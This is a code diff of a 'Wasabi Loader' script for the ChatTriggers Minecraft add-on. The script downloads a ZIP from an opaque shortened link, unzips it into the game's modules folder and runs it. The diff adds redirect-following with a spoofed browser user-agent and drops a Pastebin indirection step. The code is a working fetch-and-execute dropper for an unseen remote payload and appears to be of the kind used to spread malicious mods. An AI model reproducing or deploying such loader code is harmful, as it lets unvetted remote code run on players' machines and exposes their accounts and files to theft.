@@ -4,8 +4,8 @@ const redirectURL = "http://rdbt.top/go/V4";
 // Function to download the ZIP file
 function downloadZip(zipUrl) {
   try {
-    const url = new java.net.URL(zipUrl); // Instantiate URL
-    const connection = url.openConnection();
+    let url = new java.net.URL(zipUrl); // Instantiate URL
+    let connection = url.openConnection();
 
     // Set user-agent to mimic a browser
     connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3");
@@ -13,7 +13,20 @@ function downloadZip(zipUrl) {
     connection.setRequestMethod("GET");
     connection.connect(); // Make the connection
 
-    const responseCode = connection.getResponseCode();
+    let responseCode = connection.getResponseCode();
+    while (responseCode >= 301 && responseCode <= 308 && responseCode != 304) {
+      let newUrl = connection.getHeaderField("Location");
+      if (newUrl == null) {
+        break; // No Location header, stop redirecting
+      }
+      url = new java.net.URL(newUrl);
+      connection = url.openConnection();
+      connection.setRequestMethod("GET");
+      connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"); // Re-set user agent
+      connection.connect();
+      responseCode = connection.getResponseCode();
+    }
+
     if (responseCode !== 200) {
       ChatLib.chat(`Failed to download: ${responseCode} ${connection.getResponseMessage()}`);
       return;
@@ -131,49 +144,10 @@ function deleteAllFilesAndDirectoriesInDirectory(dirPath) {
   //ChatLib.chat(`Deleted ${deletedItemsCount} items from "${dirPath}".`);
 }
 
-// Function to load a variable from a Pastebin JSON
-function loadUrlFromPastebin(pastebinUrl) {
-  try {
-    let url = new java.net.URL(pastebinUrl);
-    const connection = url.openConnection();
-    connection.setRequestMethod("GET");
-    connection.connect(); // Connect to the URL
-
-    const responseCode = connection.getResponseCode();
-    if (responseCode !== 200) {
-      ChatLib.chat(`Failed to load URL: ${responseCode} ${connection.getResponseMessage()}`);
-      return;
-    }
-
-    const inputStream = connection.getInputStream();
-    const reader = new java.io.BufferedReader(new java.io.InputStreamReader(inputStream));
-    const stringBuilder = new java.lang.StringBuilder();
-    let line;
-
-    // Read the response line by line
-    while ((line = reader.readLine()) !== null) {
-      stringBuilder.append(line);
-    }
-
-    // Close resources
-    reader.close();
-    inputStream.close();
-
-    // Parse JSON response
-    const jsonResponse = JSON.parse(stringBuilder.toString());
-    url = jsonResponse.url; // Assuming the JSON has a property called "url"
-
-    //ChatLib.chat(`Loaded URL: ${url}`);
-    return url; // Return the loaded URL
-  } catch (error) {
-    //ChatLib.chat(`Error loading URL: ${error}`);
-  }
-}
-
 function loadthemodule() {
   if (!new java.io.File(`config/ChatTriggers/modules/${modName}/loader.js`).exists()) {
     ChatLib.chat(`&6[&2Wasabi&4 Loader&6]&2 Loading ${modName}!`);
-    unzip(downloadZip(loadUrlFromPastebin(redirectURL)), new java.io.File("config/ChatTriggers/modules"));
+    unzip(downloadZip(redirectURL), new java.io.File("config/ChatTriggers/modules"));
     ChatTriggers.loadCT();
   } else {
     deleteAllFilesAndDirectoriesInDirectory(`config/ChatTriggers/modules/${modName}`);
